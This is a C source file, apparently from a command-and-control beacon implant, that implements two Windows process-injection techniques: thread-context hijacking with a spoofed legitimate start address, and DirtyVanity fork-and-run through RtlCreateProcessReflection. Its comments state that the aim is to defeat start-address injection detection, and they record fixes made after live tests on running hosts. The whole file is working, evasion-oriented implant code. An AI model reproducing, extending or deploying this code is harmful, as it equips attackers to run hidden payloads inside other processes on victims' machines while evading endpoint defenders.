/*
 * Tier-2 item 7 (4.11/4.12 injection-technique family):
 *
 *  - PI_EXEC_OBFSETTHREADCONTEXT (0x09): CreateRemoteThread(suspended) with
 *    the thread start address set to the target's own image entry point,
 *    then SetThreadContext to the payload. The kernel-recorded StartAddress
 *    stays a legitimate image entry, which is the whole point of the 4.11
 *    default technique (defeats Get-InjectedThreadEx-style start-address
 *    checks). x64 -> x64 only.
 *
 *  - PI_EXEC_DIRTYVANITY (0x0A): fork&run through RtlCloneUserProcess - the
 *    patsy is a CLONE of our own host process (identical, legitimate image)
 *    instead of a freshly spawned binary. x64 only. Applied at the spawn
 *    sites (command_inject / command_job_spawn_logic), not in the execute
 *    chain itself, because it replaces the patsy rather than the trigger.
 */
#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include "beacon.h"
#include "commands.h"
#include "parse.h"
#include "inject.h"
#include "tokens.h"
#include "functions.h"
#include "bformat.h"
#include "syscalls.h"
#include "spawn_trace.h"

#ifndef NTSTATUS
typedef LONG NTSTATUS;
#endif
typedef NTSTATUS(NTAPI *fRtlCloneUserProcess)(ULONG, void *, HANDLE *, HANDLE *);
typedef NTSTATUS(NTAPI *fNtQueryInformationProcess)(HANDLE, ULONG, void *, ULONG, ULONG *);

/* minimal winternl shape (avoid header dependencies) */
typedef struct _T2_PBI {
	void     * Reserved1;
	void     * PebBaseAddress;
	void     * Reserved2[2];
	ULONG_PTR  UniqueProcessId;
	void     * Reserved3;
} T2_PROCESS_BASIC_INFORMATION;

#define ProcessBasicInformation 0
#define CLONE_PROCESS_FLAGS     0x00000001

/* walk the remote process's PEB to its EXE entry point (x64 layouts) */
static void * remote_exe_entry_x64(HANDLE hProcess) {
	fNtQueryInformationProcess pQIP;
	unsigned char              peb[0x20];
	unsigned char              dos[0x40];
	unsigned char              nth[0x60];
	void                     * pebaddr = NULL;
	unsigned long long         imagebase = 0;
	unsigned long              e_lfanew = 0;
	unsigned long             * aoep;
	SIZE_T                     got = 0;
	T2_PROCESS_BASIC_INFORMATION pbi;

	pQIP = (fNtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
	if (pQIP == NULL) {
		return NULL;
	}

	ZeroMemory(&pbi, sizeof(pbi));
	if (pQIP(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL) != 0 || pbi.PebBaseAddress == NULL) {
		return NULL;
	}

	pebaddr = pbi.PebBaseAddress;
	if (!beacon_ReadProcessMemory(hProcess, (char *)pebaddr + 0x10, &imagebase, 8, &got) || got != 8) {
		return NULL;
	}

	if (!beacon_ReadProcessMemory(hProcess, (char *)(DWORD_PTR)imagebase, dos, 0x40, &got) || got != 0x40) {
		return NULL;
	}

	if (dos[0] != 'M' || dos[1] != 'Z') {
		return NULL;
	}

	e_lfanew = *(unsigned long *)(dos + 0x3c);
	if (e_lfanew == 0 || e_lfanew > 0x400) {
		return NULL;
	}

	if (!beacon_ReadProcessMemory(hProcess, (char *)(DWORD_PTR)imagebase + e_lfanew, nth, 0x60, &got) || got != 0x60) {
		return NULL;
	}

	if (nth[0] != 'P' || nth[1] != 'E') {
		return NULL;
	}

	/* OptionalHeader starts at NT headers + 0x18; AddressOfEntryPoint at +0x10 */
	aoep = (unsigned long *)(nth + 0x18 + 0x10);
	return (void *)(DWORD_PTR)((unsigned char *)(DWORD_PTR)imagebase + *aoep);
}

/* 4.11 ObfSetThreadContext: legit start address, payload via context */
BOOL inject_via_obfsetthreadcontext(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID lpParameter) {
#if !defined _M_X64
	/* 4.11 constraint: same architecture, x64 only */
	return FALSE;
#else
	HANDLE hThread = NULL;
	void * legit = NULL;
	CONTEXT c;

	/* same architecture only (4.11 constraint) */
	if (!context->sameArch) {
		return FALSE;
	}

	/* a suspended target already has a legitimate start address - the plain
	 * SetThreadContext opcode handles that case; this one targets running
	 * processes where we mint a new, legitimately-started thread */
	if (context->isSuspended) {
		return FALSE;
	}

	legit = remote_exe_entry_x64(context->hProcess);
	if (legit == NULL) {
		return FALSE;
	}

	hThread = beacon_CreateRemoteThread(context->hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)legit, lpParameter, CREATE_SUSPENDED, NULL);
	if (hThread == NULL) {
		return FALSE;
	}

	ZeroMemory(&c, sizeof(c));
	c.ContextFlags = CONTEXT_FULL;
	if (!GetThreadContext(hThread, &c)) {
		TerminateThread(hThread, 0);
		CloseHandle(hThread);
		return FALSE;
	}

	/* route the thread through ntdll!RtlUserThreadStart instead of
	 * jumping straight to the payload: a thread whose context skips the
	 * ntdll bootstrap runs without the GS cookie / TLS / activation
	 * frame setup and dies on its first fault silently (live: inject
	 * into a running host reported execute-ok yet no session ever
	 * checked in). RtlUserThreadStart(StartAddress, Parameter) - the
	 * kernel-recorded StartAddress keeps pointing at the legitimate
	 * image entry from CreateRemoteThread. */
	{
		void * ustart = (void *)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlUserThreadStart");
		if (ustart == NULL) {
			TerminateThread(hThread, 0);
			CloseHandle(hThread);
			return FALSE;
		}
		c.Rcx = (DWORD64)lpStartAddress;
		c.Rdx = (DWORD64)lpParameter;
		c.Rip = (DWORD64)ustart;
	}

	if (!SetThreadContext(hThread, &c)) {
		TerminateThread(hThread, 0);
		CloseHandle(hThread);
		return FALSE;
	}

	ResumeThread(hThread);
	CloseHandle(hThread);
	return TRUE;
#endif
}

/* does the configured process-inject execute chain contain this opcode? */
BOOL procinj_execute_has(BYTE opcode) {
	char * options = setting_ptr(SETTING_PROCINJ_EXECUTE);
	datap  parser;
	DWORD  op;

	if (options == NULL) {
		return FALSE;
	}

	data_init(&parser, options, 128);

	while (TRUE) {
		op = data_byte(&parser);

		if (op == PI_EXEC_FAIL) {
			return FALSE;
		}

		if (op == opcode) {
			return TRUE;
		}

		/* skip opcode-specific payloads */
		if (op == PI_EXEC_CREATETHREAD_F || op == PI_EXEC_CREATEREMOTETHREAD_F) {
			data_short(&parser);
			data_string_asciiz(&parser);
			data_string_asciiz(&parser);
		}
	}
}

/* 4.12 DirtyVanity fork&run via RtlCreateProcessReflection. The original
 * implementation called the raw ntdll!RtlCloneUserProcess primitive and
 * then ran the normal execute chain inside the clone - but a raw clone
 * lacks the loader bootstrap state a real process start gets, so every
 * thread we minted in it AV'd inside ntdll during init (live: memset
 * movaps at ntdll+0xa4778, deterministic) and calling the raw primitive
 * from a managed host deadlocks outright (reproduced with ctypes/csc
 * probes). The official DirtyVanity contract is the reflection API: it
 * clones the target AND launches the clone's initial thread AT
 * StartAddress, so the payload must simply live in the forked address
 * space before the fork. New shape: inject_dirtyvanity_forkrun points
 * the whole inject pipeline at OUR OWN process (local mirror + profile
 * transforms), and the DirtyVanity opcode in the execute chain triggers
 * the reflection - the clone inherits the mirrored payload and its very
 * first thread runs it. Identical image to us, kernel-recorded start
 * address inside that image: the whole point of the technique. */
typedef struct _T2_RTL_PROCESS_REFLECTION_INFORMATION {
	void * UniqueProcess; /* CLIENT_ID */
	void * UniqueThread;
	void * ReflectionProcessHandle;
	void * ReflectionThreadHandle;
} T2_REFLECTION_INFORMATION;

typedef NTSTATUS(NTAPI *fRtlCreateProcessReflection)(void *, unsigned long, void *, void *, void *, T2_REFLECTION_INFORMATION *);

static BOOL dv_reflect_fired = FALSE;

BOOL inject_via_dirtyvanity_reflect(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID lpParameter) {
	fRtlCreateProcessReflection pReflect;
	T2_REFLECTION_INFORMATION info;
	NTSTATUS st;
	HMODULE nt;

	(void)lpParameter;

	/* the fork clones the context's own process - only meaningful when the
	 * pipeline targets us (the spawn-site contract) */
	if (!context->samePid)
		return FALSE;

	nt = GetModuleHandleA("ntdll.dll");
	if (nt == NULL)
		return FALSE;
	pReflect = (fRtlCreateProcessReflection)GetProcAddress(nt, "RtlCreateProcessReflection");
	if (pReflect == NULL)
		return FALSE;

	ZeroMemory(&info, sizeof(info));
	st = pReflect(GetCurrentProcess(),
	              0x1 | 0x2, /* INHERIT_HANDLES | NO_SYNCHRONIZE (PoC flags) */
	              lpStartAddress, lpParameter, NULL, &info);
	if (st != 0) {
		spawn_log("dv: reflection failed st=", (long)st);
		post_error_d(0x4a, (int)st);
		return FALSE;
	}

	spawn_log("dv: reflection fired, clone pid=", (long)(DWORD_PTR)info.UniqueProcess);
	dv_reflect_fired = TRUE;
	return TRUE;
}

BOOL inject_dirtyvanity_forkrun(char * dll, int dllen, char * parameter, int plen) {
#if !defined _M_X64
	return FALSE;
#else
	/* run the full pipeline against our own process: payload mirror,
	 * profile transforms and the execute chain all apply; the chain's
	 * DirtyVanity opcode (the same one that routed the spawn site here)
	 * performs the fork&run trigger */
	dv_reflect_fired = FALSE;
	inject_process_logic(NULL, GetCurrentProcess(), GetCurrentProcessId(),
	                     dll, dllen, 0, parameter, plen);
	return dv_reflect_fired;
#endif
}
